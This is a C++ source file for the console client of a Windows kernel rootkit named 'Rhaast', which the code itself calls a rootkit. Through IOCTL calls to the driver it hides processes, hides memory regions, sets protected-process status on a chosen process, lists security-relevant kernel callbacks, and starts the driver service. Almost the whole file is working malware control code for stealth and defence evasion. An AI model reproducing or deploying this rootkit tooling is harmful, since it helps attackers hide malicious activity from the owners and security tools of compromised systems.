#include <Rhaast.h>

#define ARGS_CHECK_LEN( l )             \
    if ( args.size() <= l ) {           \
        FmtNotEnoughArgs( args[ 0 ] );  \
        success = false;                \
        goto END;                       \
    }

#define FAIL_END    success = false; goto END;

/*!
 * @brief
 *      init connection with driver
 *
 * @param DriverName
 *      driver name to connect to
 */
Rhaast::Rhaast(
    std::string DriverName
) {
    /* try to connect now */
    RhaastConnect( DriverName );
}

/*!
 * @brief
 *      closes connection and cleans up resources
 */
Rhaast::~Rhaast(
    VOID
) {
    /* todo: free resources */
}

/*!
 * @brief
 *      check if the client has a connection/handle to the rootkit
 *
 * @return if the client is connected
 */
BOOL Rhaast::IsConnected(
    VOID
) {
    return Handle ? TRUE : FALSE;
}

/*!
 * @brief
 *      main rhaast input/output routine.
 *      creates an input field loop and dispatches
 *      given command
 */
VOID Rhaast::Routine(
    VOID
) {
    auto input = std::vector<std::string>();
    auto line  = std::string();

    /* check if we are connected */
    if ( ! IsConnected() ) {
        FmtErrorNotConnected();
    }

    /* input dispatch routine */
    do {
        input.clear();

        /* display console */
        std::cout << std::endl;
        std::cout << "[Rhaast] #> ";

        /* read input */
        getline( std::cin, line );

        /* another space */
        std::cout << std::endl;

        /* split string */
        StringTokenize( line, ' ', input );

        /* check if it is connected */
        if ( ! IsConnected() )
        {
            /* check if it is trying to connect to the driver */
            if ( input[ 0 ] != "rhaast::connect" && input[ 0 ] != "rhaast::start" ) {
                FmtErrorNotConnected();
                continue;
            }
        }

        /* now finally dispatch input */
        if ( ! DispatchInput( input ) ) {
            spdlog::error( "failed while executing command" );
        } else {
            spdlog::info( "successfully executed command" );
        }

        /* do we wanna exit now? */
        if ( ExitNow ) {
            break;
        }

    } while ( TRUE );
}

/*!
 * @brief
 *      dispatch input
 *
 * @param args
 *      input command to dispatch
 *
 * @return if given input was successfully dispatched
 */
BOOL Rhaast::DispatchInput(
    std::vector<std::string> args
) {
    bool success = true;

    if ( args[ 0 ] == "help" ) {

        FmtShowHelp();

    } else if ( args[ 0 ] == "exit" ) {

        Exit();

    } else if ( args[ 0 ] == "rhaast::connect" ) {

        /* check if enough args has been specified */
        ARGS_CHECK_LEN( 1 )

        /* if already connected then just close the connection
         * and reconnect to the specified driver name */
        if ( IsConnected() ) {
            spdlog::warn( "killing existing connection !" );

            /* close handle */
            CloseHandle( Handle );
            Handle = NULL;
        }

        /* try to connect to it */
        if ( ! RhaastConnect( args[ 1 ] ) ) {
            spdlog::info( "CreateFile failed: {}", GetLastError() );
            FAIL_END
        }

        spdlog::info( "connected to rhaast driver via \"{}\"", args[ 1 ] );

    } else if ( args[ 0 ] == "rhaast::disconnect" ) {

        /* close handle */
        CloseHandle( Handle );
        Handle = NULL;

        spdlog::info( "disconnected from rhaast driver" );

    } else if ( args[ 0 ] == "rhaast::start" ) {

        /* TODO: jesus christ i am lazy to use the service api */
        system( "sc start rhaast" );

    } else if ( args[ 0 ] == "process::hide" ) {

        ULONG  Pid  = 0;
        BUFFER Name = { 0 };

        /* check if enough args has been specified */
        ARGS_CHECK_LEN( 1 )

        /* check if arg is a number */
        if ( ! StringIsNumber( args[ 1 ] ) ) {
            spdlog::error( "specified argument is not a number" );
            FAIL_END
        }

        /* convert pid string to int */
        Pid = std::stoi( args[ 1 ].c_str() );

        if ( ProcessCheckById( Pid, &Name ) )
        {
            /* warn about patch guard detection */
            spdlog::warn( "the technique is known to trigger PatchGuard" );

            /* print basic process info */
            spdlog::info( "process to hide:" );
            spdlog::info( "   - process id   : {}", Pid );
            spdlog::info( "   - process name : {}", std::string( ( PCHAR ) Name.Buffer ) );

            /* send command */
            if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_HIDE, &Pid, sizeof( ULONG ), NULL, 0 ) ) ) ) {
                spdlog::info( "process successfully hidden" );
            } else {
                spdlog::error( "failed while hiding process" );
            }

            /* free process name memory */
            if ( Name.Buffer ) {
                RtlSecureZeroMemory( Name.Buffer, Name.Length );
                HeapFree( GetProcessHeap(), 0, Name.Buffer );
                Name.Buffer = nullptr;
            }
        } else {
            spdlog::error( "specified process id does not exists" );
            FAIL_END
        }

    } else if ( args[ 0 ] == "process::unhide" ) {

        ULONG Pid = 0;

        /* check if enough args has been specified */
        ARGS_CHECK_LEN( 1 )

        /* check if arg is a number */
        if ( ! StringIsNumber( args[ 1 ] ) ) {
            spdlog::error( "specified argument is not a number" );
            FAIL_END
        }

        /* convert pid string to int */
        Pid = std::stoi( args[ 1 ].c_str() );

        spdlog::info( "unhide process: {}", Pid );

        /* send command */
        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_UNHIDE, &Pid, sizeof( ULONG ), NULL, 0 ) ) ) ) {
            spdlog::info( "process successfully unhidden" );
        } else {
            spdlog::error( "failed to unhide process" );
        }

    } else if ( args[ 0 ] == "process::protect" ) {

        RS_C_PROCESS_PROTECTION Protection = { 0 };
        BUFFER                  Name       = { 0 };
        BOOL                    Remove     = FALSE;
        BOOL                    Light      = FALSE;

        /* check if enough args has been specified */
        ARGS_CHECK_LEN( 1 )

        RtlSecureZeroMemory( &Protection, sizeof( Protection ) );

        if ( ! StringIsNumber( args[ 1 ] ) ) {
            spdlog::error( "specified argument is not a number" );
            FAIL_END
        }

        /* set target process */
        Protection.Pid = std::stoi( args[ 1 ] );

        /* check if process exists and get name of it.  */
        if ( ! ProcessCheckById( Protection.Pid, &Name ) ) {
            spdlog::error( "specified process id does not exists" );
            FAIL_END
        }

        for ( int i = 0; i < args.size(); i++ ) {
            if ( args[ i ] == "--remove" ) {
                Remove = TRUE;
                continue;
            }

            if ( args[ i ] == "--light" ) {
                Light = TRUE;
                continue;
            }
        }

        if ( ! Remove ) {
            Protection.SignatureProtection.SignatureLevel        = 0x3f;
            Protection.SignatureProtection.SectionSignatureLevel = 0x3f;
            Protection.SignatureProtection.Protection.Type       = Light ? PsProtectedTypeProtectedLight : PsProtectedTypeProtected;
            Protection.SignatureProtection.Protection.Audit      = 0;
            Protection.SignatureProtection.Protection.Signer     = 6;
        }

        spdlog::info( "process protection:" );
        spdlog::info( " - Pid    : {}", Protection.Pid );
        spdlog::info( " - Name   : {}", std::string( ( PCHAR ) Name.Buffer ) );
        spdlog::info( " - Type   : {}", Remove ? "None" : Light ? "Protected Light" : "Protected Full" );
        spdlog::info( " - Action : {}", Remove ? "Remove" : "Add" );

        /* send command */
        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_PROTECT, &Protection, sizeof( Protection ), NULL, 0 ) ) ) ) {
            spdlog::info( "process protection applied" );
        } else {
            spdlog::error( "process protection failed to apply" );
        }

        /* free memory */
        if ( Name.Buffer ) {
            RtlSecureZeroMemory( Name.Buffer, Name.Length );
            HeapFree( GetProcessHeap(), 0, Name.Buffer );
            Name.Buffer = NULL;
        }

    } else if ( args[ 0 ] == "memory::hide" ) {

        RS_C_MEMORY_VAD MemoryVad = { 0 };

        /* check if enough args has been specified */
        ARGS_CHECK_LEN( 2 )

        /* check if arg is a number */
        if ( ! StringIsNumber( args[ 1 ] ) ) {
            spdlog::error( "specified argument is not a number" );
            FAIL_END
        }

        /* check if arg is a hex string (address) */
        if ( ! StringIsHex( args[ 2 ] ) ) {
            spdlog::error( "specified argument is not a number" );
            FAIL_END
        }

        MemoryVad.Pid     = std::stoul( args[ 1 ] );
        MemoryVad.Address = std::stoull( args[ 2 ], nullptr, 16 );

        /* first check if process exists */
        if ( ! ProcessCheckById( MemoryVad.Pid, NULL ) ) {
            spdlog::error( "specified process id does not exists" );
            FAIL_END
        }

        spdlog::info( "memory hide:" );
        spdlog::info( " - Process Id     : {}", args[ 1 ] );
        spdlog::info( " - Virtual Address: {}", args[ 2 ] );

        /* send command */
        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_MEMORY_VAD, &MemoryVad, sizeof( MemoryVad ), NULL, 0 ) ) ) ) {
            spdlog::info( "memory successfully hidden" );
        } else {
            spdlog::error( "failed to hide memory" );
        }

    } else if ( args[ 0 ] == "callback::list" ) {

        RS_C_CALLBACK_QUERY CallbackQuery = { 0 };
        PRS_CALLBACK_DATA   CallbackData  = NULL;

        /* check if enough args has been specified */
        ARGS_CHECK_LEN( 0 )

        CallbackQuery.Type = NoneCallback;
        CallbackQuery.Size = 0;

        /* send command to query size first */
        if ( ( success = NT_SUCCESS( RhaastSend(
            RHAAST_COMMAND_CALLBACK_QUERY,
            &CallbackQuery,
            sizeof( CallbackQuery ),
            &CallbackQuery,
            sizeof( CallbackQuery )
        ) ) ) ) {

            /* allocate enough memory for queried callback list */
            if ( ! ( CallbackData = ( PRS_CALLBACK_DATA ) HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, CallbackQuery.Size ) ) ) {
                spdlog::error( "HeapAlloc failed for callback list: {}", GetLastError() );
                FAIL_END
            }

            /* send command to query callback list */
            if ( ( success = NT_SUCCESS( RhaastSend(
                RHAAST_COMMAND_CALLBACK_QUERY,
                &CallbackQuery,
                sizeof( CallbackQuery ),
                CallbackData,
                CallbackQuery.Size
            ) ) ) ) {

                /* print Process Creation Notify routines */
                spdlog::info( "[PsProcessCreation] Process Creation callbacks: " );
                CallbackEnumList( PsProcessCreationCallback, CallbackData );

                /* print Thread Creation Notify routines */
                spdlog::info( "" );
                spdlog::info( "[PsThreadCreation] Thread Creation callbacks: " );
                CallbackEnumList( PsThreadCreationCallback, CallbackData );

                /* print Image Load Notify routines */
                spdlog::info( "" );
                spdlog::info( "[PsImageLoad] Image Load callbacks: " );
                CallbackEnumList( PsImageLoadCallback, CallbackData );

                /* print Driver Verification Notify routines */
                spdlog::info( "" );
                spdlog::info( "[DriverVerification] Driver Verification callbacks: " );
                CallbackEnumList( DriverVerification, CallbackData );

                spdlog::info( "" );

            } else {
                spdlog::error( "failed to query callback list size" );
            }

        } else {
            spdlog::error( "failed to query callback list size" );
        }

    } else {

        spdlog::error( "command not found: {}", args[ 0 ] );
        spdlog::warn( "to see available command type: help (command)" );
        success = false;

    }

END:
    return success;
}

/*!
 * @brief
 *      simply print out the message that the client
 *      is not connected to the rootkit
 */
VOID Rhaast::FmtErrorNotConnected(
    VOID
) {
    spdlog::warn( "not connected with rhaast driver !" );
}

/*!
 * @brief
 *      show help and available commands
 */
VOID Rhaast::FmtShowHelp(
    VOID
) {
    spdlog::info( "rhaast help:" );

}

/*!
 * @brief
 *      shows the message that not enough
 *      arguments has been specified
 *
 * @param command
 *      command string to use
 */
VOID Rhaast::FmtNotEnoughArgs(
    std::string command
) {
    spdlog::info( "not enough args has been specified for \"{}\"", command );
}

/*!
 * @brief
 *      prints out exit message and sets ExitNow flag
 */
VOID Rhaast::Exit(
    VOID
) {
    spdlog::warn( "exiting rhaast client..." );

    /* tell the routine to exit now */
    ExitNow = true;
}

/*!
 * @brief
 *      attempts to connect to the rhaast rootkit
 *
 * @param DriverName
 *      driver name to connect to
 *
 * @return
 *      if successfully connected to it
 */
BOOL Rhaast::RhaastConnect(
    std::string DriverName
) {

    /* try to open a handle to the rootkit */
    if ( ( Handle = CreateFileA(
        DriverName.c_str(),
        GENERIC_WRITE | GENERIC_READ,
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    ) ) == INVALID_HANDLE_VALUE ) {
        Handle = NULL;
    }

    return IsConnected();
}

/*!
 * @brief
 *      iterates over given data query list
 *      and prints entry based on given type
 *
 * @param Type
 *      type to enum and display
 *
 * @param Data
 *      queried data to enum
 */
VOID Rhaast::CallbackEnumList(
    RS_CALLBACK_TYPE  Type,
    PRS_CALLBACK_DATA Data
) {
    PRS_CALLBACK_DATA Callbacks       = NULL;
    PCHAR             FileName[ 258 ] = { 0 };

    /* set callback data */
    Callbacks = Data;

    do {
        /* display given type */
        if ( Callbacks->Type == Type ) {
            spdlog::info(
                " - {:p} :: {}+0x{:x}",
                ( PVOID ) Callbacks->Callback,
                Callbacks->DriverName,
                Callbacks->Callback - Callbacks->DriverBase
            );
        }

        /* exit loop */
        if ( ! Callbacks->NextEntryOffset ) {
            break;
        }

        /* next entry */
        Callbacks = ( PRS_CALLBACK_DATA ) C_PTR( U_PTR( Callbacks ) + Callbacks->NextEntryOffset );
    } while ( TRUE );
}

/*!
 * @brief
 *      Send commands to the connected rhaast rootkit
 *
 * @param Command
 *      Command Id
 *
 * @param Buffer
 *      Buffer to be send
 *
 * @param Size
 *      Size of buffer
 *
 * @return
 *      status while executing/sending command
 */
NTSTATUS Rhaast::RhaastSend(
    ULONG Command,
    PVOID Buffer,
    ULONG Size,
    PVOID Response,
    ULONG ResponseSize
) {
    NTSTATUS NtStatus = STATUS_SUCCESS;
    DWORD    BytesRet = 0;

    if ( ! DeviceIoControl(
        Handle,
        CTL_CODE( 0x8000, Command, METHOD_BUFFERED, FILE_ANY_ACCESS ),
        Buffer,   Size,
        Response, ResponseSize,
        &BytesRet,
        nullptr
    ) ) {
        spdlog::error( "DeviceIoControl Failed: {}", GetLastError() );
        NtStatus = STATUS_UNSUCCESSFUL;
    }

    return NtStatus;
}
